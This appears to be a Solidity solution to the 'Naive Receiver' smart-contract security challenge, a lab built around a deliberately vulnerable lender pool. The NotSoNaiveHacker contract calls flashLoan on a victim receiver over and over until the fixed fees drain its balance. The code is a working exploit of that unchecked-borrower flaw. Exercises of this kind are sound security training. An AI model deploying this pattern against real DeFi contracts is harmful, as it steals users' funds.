// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./NaiveReceiverLenderPool.sol";
import "hardhat/console.sol";

contract NotSoNaiveHacker {
    function executeHack(address payable _poolAddr, address _userContractAddr)
        external
    {
        /**
        The lender contract allows you to control who is the borrower and how much they borrow, with the flawed assumption that only borrowers would take flash loans on their own behalf.

        With fixed fee, if we take a flash loan enough number of times, we can drain the user contract!
         */

        uint256 fee = NaiveReceiverLenderPool(_poolAddr).fixedFee();
        uint256 userContractBalance = _userContractAddr.balance;
        uint256 numOfTimesToTakeLoan = userContractBalance / fee;

        for (uint256 i = 0; i < numOfTimesToTakeLoan; i++) {
            NaiveReceiverLenderPool(_poolAddr).flashLoan(
                _userContractAddr,
                0.000001 ether
            );
        }
    }
}
